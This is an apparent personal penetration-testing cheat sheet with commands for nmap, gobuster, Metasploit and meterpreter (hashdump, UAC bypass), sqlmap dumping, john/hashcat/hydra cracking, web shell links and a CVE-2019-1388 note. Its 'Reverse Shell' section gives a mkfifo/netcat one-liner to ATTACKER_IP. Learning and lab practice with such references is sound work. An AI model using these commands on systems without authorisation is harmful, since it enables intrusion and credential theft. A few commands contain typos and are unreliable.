# Database

---

# Tools:

# OSINT

- [Awesome OSINT list on GitHub](https://github.com/jivoi/awesome-osint)

# Stay Hidden

- VPN
    - Proton + OpenVPN
        
        ```
        # download openvpn
        sudo apt install -y openvpn
        
        # signup at proton
        
        # download conf file
        
        # copy conf file to the openvpn folder
        mv <conf.ovpn> /etc/openvpn
        
        # connect to server with credentials
        sudo openvpn /etc/openvpn/<conf.ovpn>
        ```
        

# Enumeration and Scanning

- nmap
    
    ```bash
    # scan top 1000 ports
    nmap <IP>
    
    # scan a range or ports
    nmap -p 1-100 <IP>
    
    # scan multiple ports
    nmap -p 80,443,22 <IP>
    
    # scan a list of ports from a file
    nmap -iL <file> <IP>
    
    # scan only open ports
    nmap --open <IP>
    
    # stealth scan (sends only SYN TCP flags)
    nmap sS <IP>
    
    # run default scripts from NSE(same as --scripts="default")
    nmap -sC <IP>
    
    # run a NSE category, for example the vulnerability one
    nmap --script "vuln" <IP> 
    
    # run a script by name, for example vulnera.nse (the ".nse" is optional). also, all the NSE scripts are under the "scripts" directory, and indexed in the "script.db" file which is a small databse for the scripts.
    nmap --script=vulners.nse <IP>
    
    # run all scripts that match a wildcard
    nmap --script="http*" <IP>
    
    # version scanning with maximum version intensity(same as --version-intensity 9)
    nmap -sV --version-all <IP>
    
    # scan OS
    nmap -O <IP>
    
    # aggressive scan (-sC + -sV + -O)
    sudo nmap -A <IP>
    
    # skip ping
    nmap -Pn <IP>
    
    # save results to a file
    nmap <IP> -oN scan01
    ```
    
- netcat
    
    ```bash
    # connect to port
    nc <target_ip> <port>
    
    # listen to a port (no DNS lookup)
    nc -lvnp <port>
    
    # file transfer (sender)
    nc <target_ip> <port> < file.txt
    
    # file transfer receiver)
    nc <target_ip> <port> < file.txt
    
    # port scan
    nc -zv <target_ip> <port_range>
    ```
    
- nikto
    
    ```bash
    # scan
    nikto -h <host>
    ```
    
- gobuster
    
    ```bash
    # enumerate sub-directories
    gobuster dir -u <host> -w <wordlist>
    
    # enumerate sub-directories and and provide credentials
    gobuster dir -u https://target.com -w wordlist.txt -U username -P password
    
    # enumerate file types
    gobuster dir -u <url> -w <worlist> -x <file_type>
    
    # enumerate sub-domains
    gobuster dns -d <domain> -w <wordlist>
    ```
    
- BurpSuite
    
    ```
    # Burp Suite is an integrated platform for performing security testing of 
    web applications. It includes various tools for scanning, fuzzing, 
    intercepting, and analysing web traffic. It is used by security 
    professionals worldwide to find and exploit vulnerabilities in web 
    applications.
    
    1. download from web
    	https://portswigger.net/burp/releases
    
    2. download from apt
    	apt install webext-foxyproxy
    ```
    
- WPScan
    
    ```
    https://wpscan.com/
    ```
    

# Exploitation

- msfconsole
    
    ```bash
    # open console
    msfconsole
    
    # show help
    ?
    
    # search module by type
    search type:exploit/auxiliary/post/payloads/encoders/nops/evasion
    
    # use a module 
     use <module>
     
    # show module options 
    show options
    
    # show info page of a module
    info -d
    
    # show module payload
    show payloads
    
    # set module option
    set <option> <value>
    
    # unset module option
    unset <option>
    
    # start a module
    run/exploit
    
    # run module in background
    exploit -j
    
    # show sessions
    sessions
    
    # attach to a session
    sessions <num>
    ```
    
    ```
    usefull modules:
    
    **exploit**
    windows/<x86/x64>/meterpreter_reverse_tcp
    windows/<x32/x64>/shell_reverse_tcp
    exploit/windows/local/bypassuac_eventvwr (exploit/windows/local/bypassuac_eventvwr)
    exploit/multi/script/web-delivery (can send a payload to system via HTTP request with Python or PowerShell web-delivery module)
    -----
    **post**
    multi/recon/local_exploit_suggester
    post/windows/manage/enable_rdp
    ```
    
- meterpreter
    
    ```bash
    # show help
    ?
    
    # show command help
    <command> -h
    
    # show system information
    sysinfo
    
    # run a post module from current meterpreter sessions
     run post/<module> 
     
    # show current user details
    getuid
    
    # show user privileges
    getprivs
    
    # list processes by user
    ps /U "<username>"
    
    # execute a CMD command
    execute -f cmd.exe -a "/c <your_command>" -i -H
    
    # load extensions into session (for example 'kiwi', the updated 'mimikatz')
    load <kiwi>
    
    # list extensions
    load -l
    
    # dump all of the password hashes stored on the system
    hashdump
    ```
    
- Web Shells
    - https://github.com/flozz/p0wny-shell
    - https://github.com/b374k/b374k
    - [https://www.r57shell.net/single.php?id=13](https://www.r57shell.net/single.php?id=13)
- sqlmap
    
    ```bash
    # save get/post request and run a scan against it
    sqlmap -r <file> -a
    
    # list DB
    sqlmap -u <URL> --dbs
    
    # show all tables from database
    sqlmap -u <URL> -D <databsae> --tables
    
    # dump from DB+Table
    sqlmap -u <URL> -D <databsae> -T <table> --dump
    ```
    

# Privilege Escalation

- Scripts
    - LinPeas
        
        ```bash
        # From public github
        curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh 
        ```
        
- OS Info
    
    ```bash
    # 1
    cat /ect/os-release
    #2
    cat /proc/version
    #3
    uname -a
    ```
    

# Cracking Hashes

- john (John The Ripper)
    
    ```bash
    # Crack with default settings
    john hash.txt
    
    # Crack with a custom wordlist
    john --wordlist=wordlist.txt hash.txt
    
    # Crack NTLM hashes
    john --format=nt hash.txt
    
    # Show cracked passwords
    john --show hash.txt
    
    # List supported hash formats
    john --list=formats
    
    # Crack RSA private key
    ssh2john <id_rsa> > <rsa_hash.txt>
    john --wordlist=<path_to_wordlist> <rsa_hash.txt>
    ```
    
- hashcat
    
    ```bash
    # Show all supported hash modes
    hashcat -h | grep Hash
    
    # Crack hash with a wordlist (basic example)
    hashcat -m <mode> hash.txt wordlist.txt
    
    # Crack NTLM hash with wordlist
    hashcat -m 1000 hash.txt wordlist.txt
    
    # Crack SHA256 hash with wordlist
    hashcat -m 1400 hash.txt wordlist.txt
    
    # Crack Bcrypt(blowfish) with wordlist
    hashcat -m 3200 -a 0 <hash> <wordlist>
    
    # Crack sha512crypt $6$ with wordlist
    hashcat -m 1800 -a 0 <hash> <wordlist>
    
    # Crack HMAC-SHA1 + salt with wordlist
    hashcat -m 160 -a 0 <"hash:salt"> <wordlist>
    
    # Resume a paused session
    hashcat --resume
    
    # Show cracked passwords
    hashcat -m <mode> --show hash.txt
    ```
    
- hashid (Identify the different types of hashes used to encrypt data)
    
    ```bash
    hashid <hash>
    ```
    
- [CrackStation](https://crackstation.net/)

# Cracking Passwords

- Hydra
    
    ```bash
    # crack a web login form (assuming the user is 'admin')
    hydra -l admin -P <path_wordlist> <host> http-form-post "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
    
    # Crack a web logib with get
    hydra -L users.txt -P passwords.txt <IP> http-get /<path>/
    ```
    

# Docker

- CLI Commands
    
    ```
    ***# list docker containers***
    	docker ls
    	
    ***# search for an image*** 
    	docker search <image>
    	
    **** pull an image***
      docker pull <image>
      
    **** delete and image***
      docker rm <image>
    ```
    

# Shell

- Bash
    
    ```bash
    # The #!/bin/bash line is called the shebang — it tells the system to use Bash for the script.
    #!/bin/bash
    
    # run a script
    bash <file_name> #or ./<file_name>
    
    ```
    
- Reverse Shell
    
    ```bash
    # on attacker machine
    nc -lvnp <port>
    
    # on target machine
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
    ```
    

---

# Notes:

# Windows

- Services
    - LSASS
        - (Local Security Authority Subsystem Service) is a Windows process that enforces security policies, authenticates logons, and stores credentials such as password hashes and Kerberos tickets.
        - Windows released a technology named “Credential Guard” that uses virtualization to isolate the ‘lsass’ service
- DLL
    - A DLL (Dynamic Link Library) is a Windows file containing compiled code and resources that programs can load at runtime to reuse functions without including them in their own executable.

# Prompts

- Cybersecurity
    - CVE Explainer
        
        ```
        
        I’m a beginner ethical penetration tester, and I would like you to help me with understanding CVE’s (common vulnerabilities and exposures) better.
        Use all possible knowledge you can find about Cybersecurity in order to become an expert who can assist me the best way possible. 
        
        I will provide a CVE number, and your job will be as follows:
        	1.	Start by explain it super simply in 300 words (maximum)
        	2.	Showcase a short practical demonstration of using it
        	3.	 Present a real world case it was used
        	4.	List when it was patched and how if so
        
        Ready for the first CVE ? 
        ```
        

# CVE’s

- CVE-2019-1388 (**Windows Certificate Dialog)**
    - When a low-privileged user opens a certificate file and clicks “More information” → “Learn more about certificates”, Windows tries to open a help link using **Internet Explorer**. The problem: this help window inherits **Administrator rights** if the original process was running elevated
    - Patched: Nov 2019
    - Check for KB patch:
    
    ```powershell
    # If the KB for your OS appears → the CVE is patched
    Get-HotFix -Id KB4525237,KB4525241,KB4525233,KB4523205,KB4524570,KB4525236,KB4525235,KB4525243,KB4525242
    ```

